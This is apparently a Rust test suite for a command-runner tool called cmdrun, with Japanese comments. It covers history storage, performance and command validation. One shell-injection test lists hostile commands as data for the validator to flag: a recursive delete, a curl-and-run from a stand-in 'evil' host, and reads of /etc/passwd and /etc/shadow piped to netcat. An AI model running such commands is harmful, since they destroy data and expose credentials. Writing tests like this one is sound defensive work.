//! Essential Behavior Test Suite
//!
//! cmdrunのコア機能を検証する厳選されたテストスイート
//!
//! ## テスト方針
//! このファイルは既存の統合テスト（tests/integration/）を補完し、
//! **既存テストでカバーされていない重要な機能のみ**をテストします。
//!
//! ## テスト範囲
//! - ✅ 履歴管理の詳細検証（recording, search, statistics）
//! - ✅ セキュリティ（シェルインジェクション対策、安全なコマンド検証）
//! - ✅ パフォーマンス（設定読み込み、履歴クエリ）
//!
//! ## 重複回避
//! 以下の機能は既存テストでカバー済みのため、このファイルには含めません：
//! - 基本コマンド操作 → tests/integration/test_add.rs, test_search.rs
//! - 環境管理 → tests/integration/env_commands.rs
//! - エラーハンドリング → tests/integration/test_add.rs (empty id/command/description)
//! - 境界値テスト → tests/integration/test_add.rs (unicode, long names)

use cmdrun::config::loader::ConfigLoader;
use cmdrun::history::{HistoryEntry, HistoryStorage};
use cmdrun::security::validation::ValidationResult;
use std::fs;
use std::path::PathBuf;
use tempfile::TempDir;

// ============================================================================
// Helper Functions
// ============================================================================

/// テスト用の一時環境を作成
fn create_test_environment() -> (TempDir, PathBuf) {
    let temp_dir = TempDir::new().unwrap();
    let config_path = temp_dir.path().join("commands.toml");

    // 初期設定ファイルを作成
    let initial_config = r#"
[config]
language = "english"
shell = "sh"
timeout = 30

[commands]
"#;
    fs::write(&config_path, initial_config).unwrap();

    (temp_dir, config_path)
}

/// 履歴データベースをセットアップ（完全なテスト分離のため）
///
/// 並列テスト実行時の干渉を防ぐため、以下の戦略を使用：
/// 1. タイムスタンプ + スレッドIDでユニークなDB名生成
/// 2. HistoryStorage::with_path()を使用（環境変数に依存しない）
fn setup_history_db(temp_dir: &TempDir) -> HistoryStorage {
    use std::thread;
    use std::time::{SystemTime, UNIX_EPOCH};

    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let thread_id = format!("{:?}", thread::current().id());

    let db_path = temp_dir.path().join(format!(
        "history_{}_{}.db",
        timestamp,
        thread_id.replace("ThreadId(", "").replace(")", "")
    ));

    // with_path()を使用して環境変数に依存しない完全分離を実現
    HistoryStorage::with_path(&db_path).unwrap()
}

// ============================================================================
// Test Suite 1: 履歴管理の詳細検証
// ============================================================================

#[tokio::test]
async fn test_history_recording() {
    let temp_dir = TempDir::new().unwrap();
    let mut storage = setup_history_db(&temp_dir);

    // Step 1: 履歴エントリ追加
    let entry = HistoryEntry {
        id: 0,
        command: "test-cmd".to_string(),
        args: Some(r#"["arg1", "arg2"]"#.to_string()),
        start_time: chrono::Utc::now().timestamp_millis(),
        duration_ms: Some(1500),
        exit_code: Some(0),
        success: true,
        working_dir: Some("/tmp".to_string()),
        environment: Some("default".to_string()),
    };

    let id = storage.add(&entry).unwrap();
    assert!(id > 0, "履歴エントリのIDが無効");

    // Step 2: 履歴取得（get_by_id の詳細検証）
    let retrieved = storage.get_by_id(id).unwrap().unwrap();
    assert_eq!(retrieved.command, "test-cmd");
    assert!(retrieved.success);
    assert_eq!(retrieved.duration_ms, Some(1500));
    assert_eq!(retrieved.exit_code, Some(0));
}

#[tokio::test]
async fn test_history_search() {
    let temp_dir = TempDir::new().unwrap();
    let mut storage = setup_history_db(&temp_dir);

    // 複数の履歴を追加
    let entries = vec![
        ("build", true),
        ("test", true),
        ("deploy", false),
        ("build", true),
    ];

    for (cmd, success) in entries {
        let entry = HistoryEntry {
            id: 0,
            command: cmd.to_string(),
            args: None,
            start_time: chrono::Utc::now().timestamp_millis(),
            duration_ms: Some(1000),
            exit_code: if success { Some(0) } else { Some(1) },
            success,
            working_dir: Some("/tmp".to_string()),
            environment: None,
        };
        storage.add(&entry).unwrap();
        // 異なるタイムスタンプを確保
        std::thread::sleep(std::time::Duration::from_millis(10));
    }

    // "build"で検索（複雑な時系列シナリオ）
    let results = storage.search("build", None).unwrap();
    assert_eq!(results.len(), 2, "buildコマンドが2件見つかるべき");
}

#[tokio::test]
async fn test_history_statistics() {
    let temp_dir = TempDir::new().unwrap();
    let mut storage = setup_history_db(&temp_dir);

    // 成功・失敗混在の履歴を追加
    let entries = vec![
        ("cmd1", true),
        ("cmd2", true),
        ("cmd3", false),
        ("cmd4", true),
        ("cmd5", false),
    ];

    for (cmd, success) in entries {
        let entry = HistoryEntry {
            id: 0,
            command: cmd.to_string(),
            args: None,
            start_time: chrono::Utc::now().timestamp_millis(),
            duration_ms: Some(1000),
            exit_code: if success { Some(0) } else { Some(1) },
            success,
            working_dir: None,
            environment: None,
        };
        storage.add(&entry).unwrap();
    }

    // 統計取得（成功率・平均時間の詳細検証）
    let stats = storage.get_stats().unwrap();
    assert_eq!(stats.total, 5, "合計5件の履歴があるべき");
    assert_eq!(stats.successful, 3, "成功は3件であるべき");
    assert_eq!(stats.failed, 2, "失敗は2件であるべき");
    assert_eq!(stats.success_rate(), 60.0, "成功率は60%であるべき");
}

// ============================================================================
// Test Suite 2: セキュリティ検証（重要）
// ============================================================================

#[tokio::test]
async fn test_shell_injection_prevention() {
    let (_temp_dir, _config_path) = create_test_environment();

    use cmdrun::security::validation::CommandValidator;

    let validator = CommandValidator::new();

    // 危険なコマンド例（OWASP対策）
    let dangerous_commands = vec![
        "rm -rf /; echo safe",
        "$(curl evil.com/malware.sh)",
        "cat /etc/passwd | nc attacker.com 1234",
        "; cat /etc/shadow",
    ];

    for cmd in dangerous_commands {
        let validation = validator.validate(cmd);

        // 少なくとも警告があるべき（または完全にブロック）
        let is_validated = matches!(
            validation,
            ValidationResult::Warning(_) | ValidationResult::Denied(_)
        );
        assert!(
            is_validated,
            "危険なコマンド '{}' が適切に検証されていない",
            cmd
        );
    }
}

#[tokio::test]
async fn test_safe_commands_validation() {
    use cmdrun::security::validation::CommandValidator;

    let validator = CommandValidator::new();

    // 安全なコマンド例
    let safe_commands = vec![
        "echo 'Hello, World!'",
        "cargo build --release",
        "npm install",
        "git status",
    ];

    for cmd in safe_commands {
        let validation = validator.validate(cmd);
        assert!(
            validation.is_safe(),
            "安全なコマンド '{}' が誤検知されている",
            cmd
        );
    }
}

// ============================================================================
// Test Suite 3: パフォーマンス検証
// ============================================================================

#[tokio::test]
async fn test_config_load_performance() {
    let (_temp_dir, config_path) = create_test_environment();

    // 100個のコマンドを追加
    for i in 0..100 {
        cmdrun::commands::add::handle_add(
            Some(format!("cmd{}", i)),
            Some(format!("echo {}", i)),
            Some(format!("Command {}", i)),
            None,
            None,
            Some(config_path.clone()),
        )
        .await
        .unwrap();
    }

    // 設定ファイル読み込み時間計測
    let start = std::time::Instant::now();
    let loader = ConfigLoader::with_path(&config_path).unwrap();
    let _config = loader.load().await.unwrap();
    let duration = start.elapsed();

    // 100コマンドの読み込みが100ms以下であることを確認
    assert!(
        duration.as_millis() < 100,
        "設定ファイル読み込みが遅すぎる: {:?}ms",
        duration.as_millis()
    );
}

#[tokio::test]
async fn test_history_query_performance() {
    let temp_dir = TempDir::new().unwrap();
    let mut storage = setup_history_db(&temp_dir);

    // 1000件の履歴を追加
    for i in 0..1000 {
        let entry = HistoryEntry {
            id: 0,
            command: format!("cmd{}", i % 10),
            args: None,
            start_time: chrono::Utc::now().timestamp_millis(),
            duration_ms: Some(100),
            exit_code: Some(0),
            success: true,
            working_dir: None,
            environment: None,
        };
        storage.add(&entry).unwrap();
    }

    // クエリ実行時間計測
    let start = std::time::Instant::now();
    let _results = storage.search("cmd5", None).unwrap();
    let duration = start.elapsed();

    // 1000件中の検索が50ms以下であることを確認
    assert!(
        duration.as_millis() < 50,
        "履歴検索が遅すぎる: {:?}ms",
        duration.as_millis()
    );
}
